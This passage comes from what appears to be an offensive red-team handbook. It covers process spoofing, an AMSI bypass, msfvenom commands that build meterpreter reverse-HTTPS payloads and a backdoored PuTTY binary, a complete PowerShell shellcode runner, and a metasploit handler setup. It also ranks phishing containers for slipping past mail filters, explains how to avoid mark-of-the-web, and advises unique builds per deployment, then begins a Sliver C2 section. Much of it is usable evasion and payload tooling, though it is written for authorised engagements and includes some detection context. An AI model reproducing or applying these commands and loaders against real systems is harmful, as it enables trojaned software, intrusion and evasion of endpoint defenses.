The techniques it draws on, and which are the reason to read it, are the process-creation deceptions: **parent process ID spoofing**, where you set the parent of the process you create to something plausible via a process-attribute list so that the process tree does not show a script host spawning your loader; **command line argument spoofing**, where the process is created with a benign command line and the arguments in the *RTL_USER_PROCESS_PARAMETERS* structure are overwritten in memory after creation but before the real entry point runs, so that anything reading the command line from telemetry sees the benign version; and **blocking non-Microsoft DLLs** from loading into the created process via the binary signature mitigation policy, which conveniently prevents an endpoint product's userland hooking DLL from being injected into it in the first place. It also incorporates API hashing, module stomping, and AMSI and ETW neutralisation. Treat that list as indicative rather than exact: the original AQUARMOURY repository is gone (the upstream account's copy now 404s) and what survives is third-party forks of varying vintage, so if you want the precise technique set you have to read whichever fork you actually found.

**The argument spoofing point deserves emphasis** because it is the most useful idea here. Most process-creation telemetry, including the standard Windows and Sysmon events, reads the command line once at creation. If you create the process suspended with an innocuous command line, patch the arguments in the process's memory, and then resume, the recorded command line is the innocuous one for the rest of the process's life. Products that read the command line later, or that hook at a different point, see through this, and the create-suspended plus remote-write-to-PEB sequence is itself detectable, but against the common case it works.

**Status.** The suite is old and unmaintained, and its compiled output is signatured. The process-deception techniques it demonstrates are all still relevant and all still worth implementing yourself, and they are cheap: parent spoofing and argument spoofing are both a few dozen lines using documented process-attribute APIs. Note also that argument spoofing and blocking non-Microsoft DLLs are both features of the process creation options in mainstream C2 frameworks, so you may already have them without writing code.

#### The AMSI one-liner

The source notes end with a heavily obfuscated PowerShell one-liner. It is worth explaining precisely because it is a perfect example of an obsolete artefact that still circulates.

Stripped of its backtick-and-string-concatenation obfuscation, it does one thing: use reflection to reach the private static field `amsiInitFailed` on the internal type `System.Management.Automation.AmsiUtils`, and set it to `true`. PowerShell checks that field before calling into AMSI, and treats `true` as "AMSI initialisation failed, do not attempt to scan", so every subsequent scan is skipped within that process.

The obfuscation, all the `'V'+'aR'` concatenation and the backticks inside identifiers, exists because the string `amsiInitFailed` and the type name `AmsiUtils` were the original signatures. Splitting them across concatenations meant the literal string never appeared in the script text.

**Why it is worthless now.** The signature is no longer the string, it is the pattern. Microsoft signatured the reflection chain itself: fetching a type from `System.Management.Automation`, calling `GetField` with `NonPublic, Static`, and calling `SetValue` on it. That structure survives every string-splitting trick because the structure is what is being matched. Additionally, AMSI scans the script text *before* it executes, so an AMSI bypass written in PowerShell has to survive being scanned by the very thing it is trying to disable, and this one does not. In practice, pasting that line into a current Windows host produces a detection, not a bypass.

**The transferable lesson.** Obfuscating a known-bad technique does not make it unknown, it makes it obfuscated-known-bad, which is often scored worse. When a technique is signatured at the structural level, you need a different technique, not a better encoder. Current approaches to the same objective work at a different layer: modifying the in-memory result of the scan rather than the flag that gates it, using hardware debug registers to intercept the scanning function without patching any bytes so that no code modification exists to detect, or simply not using PowerShell for anything AMSI cares about. The mechanism of AMSI, what it instruments and where the provider sits, is covered in the companion part on detection theory.

### msfvenom

msfvenom is kept in this reference for exactly one reason: it is still the fastest way to get a working, position-independent shellcode blob for a given architecture and transport. That is a genuinely valuable thing and nothing has replaced it for speed. Everything else it does, you should be sceptical of.

#### Flags that matter

| Flag | Meaning | Notes |
| --- | --- | --- |
| `-p` | Payload | `-p -` reads a custom payload from stdin |
| `-f` | Output format | `--list formats` for the full set |
| `-o` | Output file | Without it, output goes to stdout, which will corrupt your terminal for binary formats |
| `-a` | Architecture | `x86`, `x64`. Getting this wrong is the most common cause of instant crashes |
| `--platform` | Target platform | Usually inferred from the payload, specify it for `generic/*` payloads |
| `-b` | Bad characters to avoid | The legitimate reason to use an encoder |
| `-e` | Encoder | See below. Almost never what you want |
| `-i` | Encoder iterations | Almost never what you want |
| `-n` | Prepend a NOP sled of N bytes | For exploitation, not for loaders |
| `-s` | Maximum payload size | Fails loudly rather than truncating |
| `--smallest` | Minimise size | Tries encoders to find the smallest result |
| `-x` | Template executable | Embed the payload in an existing binary |
| `-k` | Keep template functionality | Requires `-x` |
| `-c` | Prepend an existing shellcode file | Chain payloads |
| `--encrypt` | Encrypt the payload | `xor`, `rc4`, `aes256`, `base64`. See `--list encrypt` |
| `--encrypt-key` | Encryption key | |
| `--encrypt-iv` | Initialisation vector | |
| `-v` | Variable name in generated source | Change it, the default `buf` is signatured |
| `--list` | Enumerate `payloads`, `encoders`, `formats`, `encrypt`, `nops` | |

**The one command you actually need.** Raw shellcode, correct architecture, no encoding, into a file:

```bash
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=$ATTACKER LPORT=$LPORT -f raw -o payload.bin
```

Note `meterpreter_reverse_https` with an underscore, which is the stageless variant, as against `meterpreter/reverse_https` with a slash, which is staged. That distinction is easy to miss and it silently changes your payload's architecture in the sense of the whole first section of this part.

**Payload options are payload-specific.** `LHOST`, `LPORT`, `EXITFUNC`, `LURI`, `HttpUserAgent`, `HttpHostHeader`, `SessionCommunicationTimeout` and similar are options of the payload module, not flags of msfvenom, which is why they are given as `KEY=value` rather than with a dash. `msfvenom -p <payload> --list-options` shows what a given payload accepts, including the ones worth setting: a realistic user agent and a sensible timeout make a measurable difference and almost nobody sets them.

#### The backdoored binary approach

The source notes' third example embeds a payload in a copy of PuTTY. Here it is with the mechanism explained:

```bash
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=$ATTACKER LPORT=$LPORT \
  -x putty.exe -k -f exe -o putty_backdoored.exe EXITFUNC=thread
```

**What `-x` does.** Uses *putty.exe* as a template rather than msfvenom's stock stub. The payload is placed into the resulting PE and the entry point is adjusted so that the payload runs. The output keeps the template's icon, its resources, its version metadata, and its general appearance, which is the entire attraction: a file that looks like PuTTY and has PuTTY's icon is more plausible to a user than *payload.exe*.

**What `-k` does, and its cost.** Without `-k`, the template's original code never runs; you get PuTTY's appearance and none of its function, so a user who double-clicks it sees nothing happen, which is suspicious. With `-k`, msfvenom arranges for the payload to run in a *separate thread* so the original program continues to execute normally. The user gets PuTTY, you get your session. The cost is reliability: `-k` has historically been fragile, particularly with 64-bit templates and with binaries that have unusual entry points, thread-local storage, or aggressive integrity checks, and the failure mode is a crash on launch or a payload that never fires. **Always test the output before deploying it.**

**What `EXITFUNC=thread` does, which the source notes pass without comment.** It selects the cleanup routine the payload calls when it finishes. The values are:

| Value | Behaviour | When to use it |
| --- | --- | --- |
| `process` | Calls `ExitProcess` | Standalone payload, nothing else in the process matters |
| `thread` | Calls `ExitThread` | The host process must survive, which is exactly the `-x -k` case, and also the case for any injected payload |
| `seh` | Returns through a structured exception handler | Exploitation, where you want the exploited process to keep running |
| `none` | Does not clean up, falls through | Chained payloads, or where you handle cleanup yourself |

So `EXITFUNC=thread` in a backdoored-binary payload is not decoration: with the default `process`, your payload exiting would terminate PuTTY, which rather ruins the illusion. Any payload you inject into a process you do not own should set `EXITFUNC=thread` for the same reason.

**Also correcting the source's handler setup.** The module is `exploit/multi/handler`, not `exploit/multihandler`, and msfconsole's `set` takes a space rather than an equals sign:

```text
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_https
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
msf6 exploit(multi/handler) > set LPORT 443
msf6 exploit(multi/handler) > set ExitOnSession false
msf6 exploit(multi/handler) > exploit -j
```

**Common mistake.** The source notes use `LPORT=445`. On your own Linux host that requires root to bind and will conflict with anything already listening, and on the target side outbound 445 is blocked at the perimeter of essentially every organisation because of decades of SMB worms. Use 443, and use an HTTPS transport so the traffic is at least shaped like the port implies. Also set `LHOST` to your externally reachable address or redirector, not to an interface address that the target cannot route to; a payload generated with an RFC1918 `LHOST` for an internet-based operation is a wasted delivery.

#### The encoder list, explained

The source notes list the x64 encoders without saying what they are for. Here is the corrected list with the note the source omits:

```bash
msfvenom --list encoders | grep x64
```

| Encoder | What it is |
| --- | --- |
| `x64/xor` | Static-key XOR with a decoder stub |
| `x64/xor_context` | XOR keyed on a value derived from the execution context, so it only decodes in the intended context |
| `x64/xor_dynamic` | XOR with a key generated at encode time and embedded in the stub |
| `x64/zutto_dekiru` | A more elaborate x64 encoder using a different stub construction |

**None of these are evasion tools.** They exist to change your payload's byte composition, which solves bad-character problems. Every one of them produces a decoder stub that must write to and execute memory, every one of them yields the original plaintext shellcode in memory once decoded, and every one of the stubs is signatured. `x64/xor_context` is the mildly interesting exception, in that context-keyed decoding is a primitive form of the environmental keying idea discussed earlier, but the real version of that idea is something you implement in your own loader with a key derived from properties you chose.

If you want the payload not to be recognisable in the artefact, use `--encrypt aes256` with your own key, or better, do the encryption in your own loader where you control the key derivation:

```bash
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=$ATTACKER LPORT=$LPORT \
  -f raw --encrypt aes256 --encrypt-key "$(openssl rand -hex 16)" -o payload.enc
```

#### Reformatting arbitrary shellcode

`generic/custom` takes a file of raw bytes and lets msfvenom treat it as a payload, which makes msfvenom a general-purpose shellcode format converter for output from any tool:

```bash
msfvenom -p generic/custom PAYLOADFILE=beacon.bin -a x64 --platform windows -f csharp -v scBuf
```

This is genuinely useful: generate shellcode with your C2, convert it to whatever source format your loader wants, and change the variable name off the default while you are there.

#### The honest summary

**Default framework payloads are detected everywhere.** A stock `-f exe` Meterpreter binary will be caught by every antivirus product on the market, and it should be, because the byte patterns have been public for fifteen years. The source notes say this and then partly undercut it by suggesting encoders as a remedy. There is no remedy at the msfvenom layer.

**The value is the raw shellcode as input to your own loader.** `-f raw` into your own encrypted, obfuscated, environmentally keyed loader is the correct use of this tool. `-f exe` is for testing whether a listener works.

### The PowerShell shellcode runner

The source notes include a large PowerShell script with an embedded shellcode buffer. It is worth dissecting properly, because the pattern it demonstrates is genuinely instructive and the specific script is genuinely dead.

#### What it does, mechanically

The script has four moving parts.

**Resolving function addresses without a compile-time import.** The obvious way to call `VirtualAlloc` from PowerShell is `Add-Type` with a `DllImport` declaration. That requires compiling C# on the fly, which invokes *csc.exe*, writes temporary files to disk, and is loudly instrumented. The script avoids it by finding a function that already exists in the loaded managed assemblies: `Microsoft.Win32.UnsafeNativeMethods` inside *System.dll* contains private wrappers for `GetModuleHandle` and `GetProcAddress`. The script locates *System.dll* among the loaded assemblies, reflects on that internal type, and invokes those two methods to get an arbitrary function pointer from an arbitrary DLL. No compilation, no `DllImport`, no disk write. This is the clever bit.

**Constructing a delegate type at runtime.** Having a raw function pointer is useless in managed code unless you have a delegate type with a matching signature to marshal it through. Since the script cannot declare types at compile time, it builds one at runtime using the reflection emit APIs: define a dynamic assembly in memory, define a module, define a type deriving from `MulticastDelegate`, define a constructor and an `Invoke` method with the parameter and return types you want, and create the type. `Marshal.GetDelegateForFunctionPointer` then binds the raw pointer to that type, giving you a callable object.

**Allocating and copying.** Call the `VirtualAlloc` delegate to get a region, then `Marshal.Copy` the byte array into it.

**Creating a thread.** Call the `CreateThread` delegate with the region's base address as the start routine, then `WaitForSingleObject` with an infinite timeout so the script does not exit and unload the process while the shellcode is running.

#### Two real bugs in the source version

**The allocation size is hardcoded to `0x1000`.** The script calls `VirtualAlloc` with a size of 4096 bytes regardless of the payload, then copies `$buf.Length` bytes into it. `VirtualAlloc` rounds the commit up to page granularity, so 4096 bytes gets you exactly one page. Any payload larger than 4096 bytes writes past the end of the committed region into unmapped memory, and you get an access violation. The stager in the source is under 4096 bytes so it happens to work, which is exactly the kind of accident that produces a script people copy and then cannot debug when they swap in a real stageless payload. Always allocate `$buf.Length`.

**The protection is `0x40`, which is `PAGE_EXECUTE_READWRITE`.** For all the reasons in the memory protection section above, this is the single most detectable memory state you can create. Allocate read-write and flip to read-execute.

#### Why this specific script is signatured to death

It has been published essentially verbatim in dozens of blog posts, training courses, and cheatsheets since around 2017, including this one. The consequences are cumulative:

The function and variable names are constants across every copy. `LookupFunc`, `getDelegateType`, `$lpMem`, and the assembly name `ReflectedDelegate` are all literal strings in the script text, and all of them are AMSI signatures. The reflection chain to `Microsoft.Win32.UnsafeNativeMethods` is itself signatured, independently of naming. The string `VirtualAlloc` adjacent to `CreateThread` in a PowerShell script is signatured. The default `[Byte[]] $buf` variable name from msfvenom's PowerShell output is signatured. And AMSI sees the script text before any of it executes, so nothing in the script can protect the script.

On top of that, PowerShell is the most instrumented execution environment on Windows. Script block logging records the deobfuscated content of every block that runs, so even a heavily obfuscated version is logged in the clear as event ID 4104. Module logging records pipeline execution. Transcription records everything. And the reflection-emit calls themselves generate distinctive CLR ETW events.

#### The transferable lesson

The **pattern** is what is valuable, and it generalises far beyond PowerShell: **resolve what you need at runtime from something that is already loaded, rather than declaring it at compile time.** That principle drives API hashing in native loaders, dynamic import resolution, the export-sorting technique for syscall numbers, and the reflection trick here. It is the difference between a binary whose import table announces its intentions and one that announces nothing.

The **implementation** is worthless, because it is public, static, and named. If you want this pattern in a managed context in 2026, you write it yourself, with your own names, resolving through a path nobody has published, in a language and host that is not the single most instrumented interpreter on the platform.

#### A cleaned-up version, as a teaching artefact

Explicitly a teaching artefact. This will be caught. It is here so the mechanism is legible, not so it can be deployed.

```powershell
# TEACHING ARTEFACT. Signatured. Read it, understand the pattern, then write your own.

function Get-ProcAddress {
    param([string]$Module, [string]$Function)

    # System.dll contains internal wrappers for GetModuleHandle and GetProcAddress.
    # Reflecting on them avoids Add-Type, csc.exe, and a temporary file on disk.
    $systemDll = [AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\')[-1] -eq 'System.dll' }

    $native          = $systemDll.GetType('Microsoft.Win32.UnsafeNativeMethods')
    $getModuleHandle = $native.GetMethod('GetModuleHandle')
    $getProcAddress  = $native.GetMethods() |
        Where-Object { $_.Name -eq 'GetProcAddress' } | Select-Object -First 1

    $hModule = $getModuleHandle.Invoke($null, @($Module))
    $getProcAddress.Invoke($null, @($hModule, $Function))
}

function New-DelegateType {
    # Build a delegate type at runtime so a raw function pointer can be marshalled
    # through it. Needed because we cannot declare types at compile time here.
    param([Type[]]$Parameters, [Type]$ReturnType = [void])

    $builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        (New-Object System.Reflection.AssemblyName('Dyn')),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run)

    $type = $builder.DefineDynamicModule('DynMod', $false).DefineType(
        'DynDel', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

    $type.DefineConstructor('RTSpecialName, HideBySig, Public',
        [System.Reflection.CallingConventions]::Standard, $Parameters).
        SetImplementationFlags('Runtime, Managed')

    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual',
        $ReturnType, $Parameters).SetImplementationFlags('Runtime, Managed')

    $type.CreateType()
}

function Get-NativeFunction {
    param([string]$Module, [string]$Function, [Type[]]$Parameters, [Type]$ReturnType)
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        (Get-ProcAddress $Module $Function),
        (New-DelegateType $Parameters $ReturnType))
}

# --- payload -----------------------------------------------------------------
# Replace with your own bytes. msfvenom -f ps1 emits a variable named $buf,
# which is signatured, so rename it. Better: fetch encrypted and decrypt here.
[Byte[]] $payload = 0x90, 0x90, 0xC3

# --- constants ---------------------------------------------------------------
$MEM_COMMIT_RESERVE  = 0x3000
$PAGE_READWRITE      = 0x04
$PAGE_EXECUTE_READ   = 0x20
$INFINITE            = 0xFFFFFFFF

# --- allocate read-write, sized to the payload -------------------------------
# The commonly copied version hardcodes 0x1000 and uses PAGE_EXECUTE_READWRITE.
# Both are wrong: the first truncates, the second creates RWX private memory.
$VirtualAlloc = Get-NativeFunction kernel32.dll VirtualAlloc `
    @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])

$base = $VirtualAlloc.Invoke([IntPtr]::Zero, [UInt32]$payload.Length,
                             $MEM_COMMIT_RESERVE, $PAGE_READWRITE)
if ($base -eq [IntPtr]::Zero) { throw 'VirtualAlloc failed' }

# --- write -------------------------------------------------------------------
[System.Runtime.InteropServices.Marshal]::Copy($payload, 0, $base, $payload.Length)

# --- flip to read-execute, never write-execute -------------------------------
$VirtualProtect = Get-NativeFunction kernel32.dll VirtualProtect `
    @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])

$oldProtect = 0
if (-not $VirtualProtect.Invoke($base, [UInt32]$payload.Length,
                                $PAGE_EXECUTE_READ, [ref]$oldProtect)) {
    throw 'VirtualProtect failed'
}

# --- execute -----------------------------------------------------------------
$CreateThread = Get-NativeFunction kernel32.dll CreateThread `
    @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])

$hThread = $CreateThread.Invoke([IntPtr]::Zero, 0, $base,
                                [IntPtr]::Zero, 0, [IntPtr]::Zero)

# Wait, or the script exits and the runspace tears down the thread.
$WaitForSingleObject = Get-NativeFunction kernel32.dll WaitForSingleObject `
    @([IntPtr], [UInt32]) ([UInt32])

$WaitForSingleObject.Invoke($hThread, $INFINITE) | Out-Null
```

**Failure modes.**

| Symptom | Cause |
| --- | --- |
| `Cannot find type Microsoft.Win32.UnsafeNativeMethods` | You are on PowerShell 7 or another dotnet Core host. The internal type lives in the dotnet Framework *System.dll* and does not exist there. Use *powershell.exe*, not *pwsh.exe*, or use a different resolution path |
| Immediate AMSI block on paste | Expected. The script text is signatured before execution |
| Access violation on `Marshal.Copy` | Allocation smaller than the payload. The classic `0x1000` bug |
| Shellcode runs then the shell dies instantly | Architecture mismatch, x86 shellcode in a 64-bit host or the reverse |
| Nothing happens and the script returns | Missing wait, or the payload's `EXITFUNC` terminated the thread before comms established |
| Works interactively, fails from a scheduled task or service | No interactive session, or a different bitness of *powershell.exe* was invoked from the *SysWOW64* path |

### Delivery

Getting the payload to the target is a separate problem from making it run undetected, and it is the one that most often dictates your format. This section is deliberately about the container and the transport rather than the code.

#### What survives email and web filtering

Mail gateways and web proxies apply layered controls: extension blocking, content-type inspection, archive extraction and recursive scanning, sandbox detonation, URL rewriting and reputation, and increasingly full attachment rendering. What gets through changes constantly, but the shape of the problem does not.

| Container | Current viability | Notes |
| --- | --- | --- |
| Bare `.exe`, `.dll`, `.scr` attachment | Effectively zero | Blocked by extension at every gateway |
| Office document with a VBA macro | Very low for internet-sourced files | Office blocks macros in files with MOTW by default since 2022. Still viable for files delivered by a route that does not set MOTW |
| Office document with a remote template or external relationship | Low to moderate | Fetches a payload at open time, so the attachment itself is clean at scan time |
| `.xll` Excel add-in | Moderate | A native DLL Excel loads. Increasingly blocked by policy and by ASR |
| `.lnk` shortcut | Moderate, still widely used | Tiny, holds an arbitrary command line, icon is fully controllable, and the target field is easy to hide from a casual look. Often shipped inside an archive |
| Password-protected archive | Moderate | Defeats gateway extraction and scanning, and defeats sandbox detonation, at the cost of requiring the user to type a password, which is itself a suspicious instruction. Note that a password-protected archive is now itself a strong indicator to many gateways |
| `.iso`, `.img`, `.vhd`, `.vhdx` | Reduced from its peak | Was the standard MOTW bypass. Windows now propagates MOTW to files extracted from mounted images, so the primary advantage is gone. Still useful as an extension-blocking bypass and to hide contents from gateway scanning |
| `.7z`, `.zip`, `.tar` | Depends on the gateway | Most gateways extract and scan recursively. Modern archivers propagate MOTW to extracted files |
| `.chm` compiled help | Low | Old technique, well signatured, but occasionally still unblocked |
| `.msi` installer | Moderate to good | Installers are expected to be executables that do system-level things, which is a large behavioural allowance. Often permitted by policy where bare executables are not |
| `.msix` / `.appx` | Situational | Requires a valid signature from a trusted publisher, which is a hard requirement, but delivers a strong installation story if you have one |
| `.svg` with embedded content | Moderate | HTML smuggling in a format gateways often treat as an image |
| HTML smuggling | Good | The payload is assembled in the browser from data embedded in the page, so no file crosses the proxy for inspection. Increasingly countered by ASR and by proxies that execute page content |
| `.one` OneNote with an embedded attachment | Was good, now reduced | Microsoft added blocking for embedded file types in OneNote |
| ClickOnce (`.application`) | Situational | A signed deployment manifest that installs and runs from a URL. Powerful when it works |

The general point: **the container is chosen to satisfy the filter, and the filter's constraints then dictate your payload format.** If the only thing that gets through is a *.lnk* inside a password-protected archive, then your payload must be something a shortcut's command line can invoke, which means a script host, a LOLBin, or a file the archive also contains. That decision was made by the mail gateway, not by your evasion strategy. Work backwards from the constraint.

#### Mark of the web

When a file arrives via a browser, a mail client, or another zone-aware application, Windows attaches an NTFS alternate data stream named *Zone.Identifier* containing a zone number, with 3 meaning the internet zone. This is the **mark of the web**, and it changes execution behaviour substantially:

- Office opens the file in Protected View, and blocks VBA macros outright rather than prompting.
- SmartScreen performs a reputation check on execution and blocks or warns on unknown files.
- The Attack Surface Reduction rule that blocks executable content from email and webmail clients keys on this.
- Some script hosts and installers behave more conservatively.
- Windows Defender Application Control and similar policies may treat the file differently.

Inspect and strip it locally:

```powershell
# See it
Get-Item .\payload.exe -Stream Zone.Identifier
Get-Content .\payload.exe -Stream Zone.Identifier

# Remove it
Unblock-File .\payload.exe
Remove-Item .\payload.exe -Stream Zone.Identifier
```

That is useful in your own lab and useless on the target, because you are not there to run it. **What matters operationally is which delivery routes do not set MOTW in the first place.** Historically, files inside a mounted ISO or VHD did not inherit it, which is why disk images became the standard phishing container around 2021 and 2022; Windows closed that. Files written by a process that is not zone-aware, files copied over SMB from a trusted-zone location, and files created by an already-executing process on the target do not get marked. That last one is why a first-stage that downloads and writes a second-stage sidesteps the problem entirely: the second stage was written by a local process, not by a browser.

#### Script hosts, shortcuts, and installers

**Script hosts.** *wscript.exe* and *cscript.exe* run *.vbs*, *.js*, *.wsf* and *.wsc*. *mshta.exe* runs *.hta* and inline script from a URL. These are signed Microsoft binaries with legitimate uses, so the process itself is not the indicator; the command line and the parent relationship are. Script content is subject to AMSI. The advantage of script delivery is that it is text, so it is trivially modified per target and carries no PE structure for a static scanner to key on. The disadvantage is that Windows instruments script execution more thoroughly every release, and many organisations now simply block these hosts by policy or by ASR rule, which is the correct configuration and increasingly the common one.

**Shortcuts.** A *.lnk* file holds a target path, an arbitrary argument string, a working directory, an icon location, and a description. Every one of those is attacker-controlled. The icon can be pulled from a legitimate binary or DLL resource so the shortcut looks like a document. The argument string can be long, and Explorer's properties dialogue truncates what it shows, so padding the command line with whitespace hides the interesting part from a user who checks. Shortcuts are small, need no macro, and are not executables, which is why they replaced macro documents as the default phishing payload. They are also now heavily monitored: a *.lnk* whose target is a script host or a shell, executed from a user's download or temp directory, is a strong detection.

**Installers.** *msiexec.exe* installing a package is one of the more permissive execution paths on Windows, because installation legitimately involves writing to protected locations, creating services, and running custom actions. An MSI's custom actions can execute arbitrary code, including a DLL or an executable embedded in the package's binary table. The behavioural allowance is genuinely large, and MSI delivery is frequently permitted where bare executables are not. The cost is that MSI installation is logged thoroughly, appears in the installed-programs inventory unless you suppress it, and *msiexec* spawning unexpected children is a well-known hunt.

**Signed LOLBin execution generally.** The pattern behind all of the above is the same: get a signed, trusted, expected Microsoft binary to execute your code, so that the process creation event names something benign. What defeats it is not signature checking, it is behavioural correlation: *mshta.exe* making an outbound TLS connection, *msiexec.exe* spawning *cmd.exe*, *rundll32.exe* with a command line pointing at a user-writable directory. Choosing a signed host does not make you invisible, it changes which anomaly you present.

#### Delivery constraints dominate

The final and most practical point of this section. Operators spend enormous effort on loader evasion and then get stopped at the gateway, or get through the gateway with a format that cannot run their payload. Decide delivery first:

1. What actually reaches the user or the host? Test this against the real controls if you can, or infer it from reconnaissance of the mail infrastructure and the browser and proxy configuration.
2. What execution primitives does that container give you? A shortcut gives you a command line. An MSI gives you a custom action. HTML smuggling gives you a file on disk with no MOTW if the browser wrote it via a script-triggered download, or with MOTW if it went through the normal download path.
3. What payload format does that primitive consume? Now, and only now, choose between shellcode in a loader, a DLL for a signed host, a dotnet assembly, or a script.

Working in the other direction, building a beautiful loader and then hunting for a way to deliver it, is how engagements lose a week.

### Build and test workflow

The difference between an operator who occasionally gets caught and one who consistently does not is usually process rather than technique.

#### Target the right thing

**Architecture must match the host process, not the operating system.** x64 shellcode in a 32-bit process crashes immediately, and so does the reverse. This is not exotic: *powershell.exe* exists in both *System32* and *SysWOW64*, scheduled tasks and services may invoke either, and some Office installations are still 32-bit on 64-bit Windows. When a payload "works locally and dies on the target", check this first. Where you cannot be sure, build both and select at runtime, or use a container that pins the bitness.

**Target framework for managed payloads.** A dotnet assembly built against a runtime the target does not have will not load. dotnet Framework 4.8 is present on essentially all current Windows; anything requiring a specific dotnet Core or dotnet 8 runtime requires that runtime to be installed, which for an implant is an unacceptable dependency. Build post-exploitation tooling against the lowest framework version that supports what you need, and check that your language features and library calls are actually available there rather than trusting the compiler to tell you at runtime.

**Match the host process's subsystem and CLR state.** Injecting a managed payload into a process with no CLR loaded means loading the CLR, which is loud. Prefer a target that is already managed.

#### Reproducible builds and per-engagement uniqueness

These two requirements pull in opposite directions and you need both.

**Reproducible** means that given the same inputs you get the same output, so you can reason about what you deployed, reproduce a bug reported from the field, and know exactly which artefact corresponds to which hash in someone's log. Pin your compiler version, pin your dependencies, script the build, and record the toolchain in your notes.

**Unique per artefact** means that one burnt payload does not burn all of them. If you build one loader and deploy the same binary to forty hosts across three clients, the first detection hands the vendor a hash that kills every deployment simultaneously, and worse, links your engagements together. The mechanism to get both properties is a **parameterised build**: a scripted build that takes a seed and produces a functionally identical but byte-different artefact, varying the things that do not affect behaviour.

Things worth varying per build:

- Encryption key and initialisation vector for the payload body.
- Function, variable, and symbol names.
- The set and order of compiled-in string constants.
- Padding and filler, both for size and for entropy management.
- The specific execution primitive, if you implemented more than one.
- The syscall stub randomisation seed, if you are generating stubs.
- File metadata: version resource, company name, product name, original filename, icon.
- Section names and section ordering where your toolchain allows it.
- Compiler optimisation flags, which perturb code layout for free.

Things that must not vary, because they are your correctness surface: the payload semantics, the configuration values you tested against, and the target framework and architecture.

**Strip the incidental fingerprints on every build.** PDB paths embed your username and directory structure. Rich headers embed your exact compiler and linker build numbers. Go binaries embed module paths and build IDs. Rust binaries embed crate paths. These do not affect execution and they identify your toolchain, your project, and sometimes you personally across every artefact you have ever built.

#### Track what you deployed where

Keep a deployment record, per engagement, that answers these questions without you having to remember:

| Field | Why you need it |
| --- | --- |
| Artefact hash, SHA-256 | Correlating with client-side detections and with any subsequent vendor submission |
| Build seed and build timestamp | Reproducing the exact artefact |
| Payload configuration: C2 address, transport, sleep, jitter, keying inputs | Knowing what a recovered sample discloses |
| Target host and account | Cleanup, and answering "was that us?" |
| Delivery method and full path written | Cleanup, and reconstructing the timeline |
| Persistence created: registry key, service name, task name, file path | **This is the field people omit and then cannot clean up** |
| Time deployed and time last seen | Scoping the client's investigation window |
| Detection outcome | Building an evidence base for what actually works in this environment |

The cleanup case is the obvious one, and it is a professional obligation: leaving an implant, a service, a scheduled task, or a certificate on a client estate after the engagement is a genuine finding against you. The less obvious case is attribution during the engagement: when the client's security team reports suspicious activity, you need to say within minutes whether it was you, because if it was not, they have a real intrusion and every hour you spend checking is an hour they lose.

#### Test before deployment, not in production

**Build a representative test environment.** Representative means running the same endpoint product, the same version, the same policy configuration, and the same OS build as the target, as far as you can determine those from reconnaissance. A payload that survives your unmanaged Windows 11 VM tells you approximately nothing about a managed host with a current EDR agent and a tuned ASR policy.

**Test the whole chain, not the loader.** Delivery, container extraction, MOTW state, execution primitive, loader, payload, comms, and sleep. Each link fails independently. The most common surprise is that the loader is fine and the container never opened, or that comms fail because the target's egress requires proxy authentication your implant does not perform.

**Never upload an artefact to a multi-engine scanning service.** Public scanning services distribute samples to vendors. Uploading your loader is the single most efficient way to get it signatured, and it can happen within hours. If you need multi-engine feedback, use a service that contractually does not share samples, and understand that "does not share" is a promise you are trusting. The safest approach is a local lab with the specific products you care about.

**Test the failure paths deliberately.** What does your loader do when the allocation fails, when the C2 is unreachable, when the environmental key does not match, when it lands on the wrong architecture? The answer should be "exits quietly", not "crashes with a dialogue box" and not "loops making connection attempts every second until someone notices". An implant's error handling is part of its opsec.

**Verify quietly and specifically.** Confirm your payload ran by checking for your callback, not by checking whether the process is still running. Confirm your loader's memory state matches what you intended, using a memory-inspection tool in your lab, so you know whether you actually produced `RX` private memory or accidentally left it `RWX`. Confirm what your loader looked like in the endpoint product's own telemetry if you have access to the console in your lab, because that is exactly the view the defender will have.



# Command and Control

## Sliver

Sliver is the reference open-source C2 framework for this document, not because it is the best at any single thing but because it is the one where every part of the pipeline is inspectable: the implant is Go, the server is Go, the transports are documented, and the extension system is a directory of JSON manifests you can read. If you understand Sliver end to end you can pick up Mythic, Havoc, or a commercial framework and only have to learn new vocabulary. Everything in this section is written so that the concept survives the tool. Where a flag is version-sensitive it is called out.

The version boundary that matters most: Sliver 1.5 and Sliver 1.6 differ in several command names and in how staging and HTTP C2 profiles are configured. Run `version` in the console first and treat any syntax in any cheatsheet, including this one, as a hypothesis until `help <command>` confirms it.

### The beacon and session model

This is the single most important concept in the whole framework and the one the original notes never explained despite generating both kinds of implant.

**What it is.** A Sliver implant runs in one of two modes. A **session** holds a live connection to the server for its entire life and executes your commands the moment you type them. A **beacon** sleeps for an interval, wakes, connects, collects whatever tasks you have queued, runs them, returns the results, disconnects, and sleeps again. Same implant codebase, same transports, different control loop.

**Why it works, and why it matters.** A session is a long-lived socket. Long-lived sockets are the easiest C2 artefact in the world to find: a workstation holding a single TLS connection open to one external IP for six hours is an anomaly no matter how good your certificate is. A beacon looks like a machine that talks to a web service periodically, which is what every machine on the estate does. The beacon model exists to make your traffic statistically boring. The price is latency, and the latency is not a minor inconvenience, it restructures how you work.

Concretely: with a 60 second interval you get roughly one command per minute. A five-step enumeration sequence is five minutes. A mistake in step two that you notice in step four costs you eight minutes to unwind. With a 15 minute interval, which is entirely reasonable on a mature estate, a five-step sequence is over an hour and you cannot afford to be sloppy. Operators new to beacons burn whole days by treating the console like a shell.

**Tasking queues.** When you type a command against a beacon, the server does not send anything. It writes a task record and returns immediately. On the next check-in the beacon pulls the pending tasks, executes them, and pushes results back. This means:

